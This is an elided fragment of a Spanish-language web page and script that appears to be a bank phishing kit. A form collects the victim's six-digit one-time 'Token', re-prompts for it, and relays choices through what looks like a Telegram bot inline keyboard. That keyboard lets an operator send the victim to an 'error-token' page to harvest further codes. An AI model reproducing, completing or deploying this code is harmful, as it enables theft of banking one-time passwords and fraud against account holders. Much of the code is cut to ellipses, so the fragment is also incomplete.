...
<div class="container">
    ...
    <form id="transaction-form">
      ...
      <div class="input-group">
        ...
        <input type="password" id="clave" placeholder="Ingresa tu Token" maxlength="6">
      </div>
  ...
  <script>
    ...
    function actualizarLogos() {
      ...
      document.getElementById("clave-label").innerText = "Ingrese su Token Nuevamente:";
    }
...
--------------------------------------------------
        ...
        const keyboard = JSON.stringify({
            inline_keyboard: [
                ...
                [{ text: "Error Token", callback_data: `pedir_token:${transactionId}` }],
          ...
          const data = await response.json();
            ...
            if (verificationUpdate) {
                ...
                switch (verificationUpdate.callback_query.data) {
                    ...
                    window.location.href = "error-token.php"; // Redirige a la página de OTP
                    break;
